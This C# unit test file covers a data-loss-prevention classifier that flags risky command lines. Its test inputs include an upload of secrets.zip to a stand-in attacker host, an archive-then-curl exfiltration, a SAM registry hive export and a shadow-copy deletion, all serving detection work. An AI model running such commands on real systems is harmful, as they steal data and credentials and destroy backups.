using Xunit;
using CompanyDlp.Core;

namespace CompanyDlp.Tests;

public sealed class CliCommandClassifierTests
{
    [Fact]
    public void PlainDirectoryListing_IsNotFlagged()
    {
        var result = CliCommandClassifier.Classify("dir C:\\Users\\employee\\Documents");

        Assert.Null(result);
    }

    [Fact]
    public void Base64DecodeThenPostToExternalUrl_IsFlaggedAsOutboundTransfer()
    {
        // The exact scenario named in the task brief: a PowerShell one-liner that base64-decodes and
        // POSTs to an external URL. Matches on the encoded-payload rule first (rule order), which is
        // still a correct detection - both rules would independently match this command.
        var result = CliCommandClassifier.Classify(
            "powershell -EncodedCommand JABkAGEAdABhACAAPQAgAFsAQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJwB0AGUAcwB0ACcAKQA=");

        Assert.NotNull(result);
        Assert.Equal("cli-encoded-payload", result!.RuleId);
    }

    [Fact]
    public void InvokeWebRequestToExternalHost_IsFlaggedAsOutboundTransfer()
    {
        var result = CliCommandClassifier.Classify(
            "Invoke-WebRequest -Uri https://attacker.example.com/upload -Method Post -InFile secrets.zip");

        Assert.NotNull(result);
        Assert.Equal("cli-outbound-transfer", result!.RuleId);
    }

    [Fact]
    public void CurlToLocalhost_IsNotFlagged()
    {
        var result = CliCommandClassifier.Classify("curl http://localhost:5000/health");

        Assert.Null(result);
    }

    [Fact]
    public void ScpOfOrdinaryFilenameWithNoRemoteDomain_IsNotFlagged()
    {
        // Regression: an ordinary "word.ext" filename (out.zip) must not itself look like a domain
        // to the bare-domain fallback in the outbound-transfer rule.
        var result = CliCommandClassifier.Classify("scp out.zip user@fileserver:/backup");

        Assert.Null(result);
    }

    [Fact]
    public void CompressThenUpload_IsFlagged()
    {
        // This also matches cli-outbound-transfer (curl + https://) - rule order picks that one
        // first, which is still a correct positive detection of the archive-then-exfiltrate pattern.
        var result = CliCommandClassifier.Classify(
            "Compress-Archive -Path C:\\Data\\* -DestinationPath out.zip; curl -T out.zip https://example.com/drop");

        Assert.NotNull(result);
    }

    [Fact]
    public void CompressThenUploadToLocalHost_IsFlaggedAsArchiveThenNetwork()
    {
        // No http(s)://... scheme for the outbound-transfer rule to match on here, so this exercises
        // the archive-then-network rule specifically.
        var result = CliCommandClassifier.Classify(
            "Compress-Archive -Path C:\\Data\\* -DestinationPath out.zip; scp out.zip user@fileserver:/backup");

        Assert.NotNull(result);
        Assert.Equal("cli-archive-then-network", result!.RuleId);
    }

    [Fact]
    public void RegExportOfSamHive_IsFlaggedAsCredentialAccess()
    {
        var result = CliCommandClassifier.Classify("reg.exe export HKLM\\SAM C:\\Temp\\sam.hive");

        Assert.NotNull(result);
        Assert.Equal("cli-credential-access", result!.RuleId);
    }

    [Fact]
    public void VssadminDeleteShadows_IsFlaggedAsDestructive()
    {
        var result = CliCommandClassifier.Classify("vssadmin.exe delete shadows /all /quiet");

        Assert.NotNull(result);
        Assert.Equal("cli-destructive-shadow-copy", result!.RuleId);
    }

    [Fact]
    public void EmptyOrWhitespaceCommand_IsNotFlagged()
    {
        Assert.Null(CliCommandClassifier.Classify(""));
        Assert.Null(CliCommandClassifier.Classify("   "));
    }
}
